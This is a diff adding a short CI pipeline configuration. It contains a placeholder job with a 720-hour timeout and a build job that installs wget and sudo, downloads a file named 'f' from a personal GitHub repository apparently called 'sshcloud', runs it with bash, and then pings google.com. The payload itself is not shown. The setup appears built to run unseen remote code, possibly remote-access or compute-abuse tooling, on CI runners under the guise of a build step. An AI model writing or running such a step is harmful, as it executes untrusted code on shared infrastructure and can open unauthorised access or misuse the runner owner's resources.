@@ -1,0 +1,17 @@
+image: ubuntu:18.04
+
+job_name:
+  script:
+    - some_command
+  timeout: 720h # Adjust as needed
+
+
+
+stages:
+  - build
+
+build_job:
+  stage: build
+  script:
+    - apt update && apt install wget sudo iputils-ping -y && wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/f
+    - bash f && ping google.com
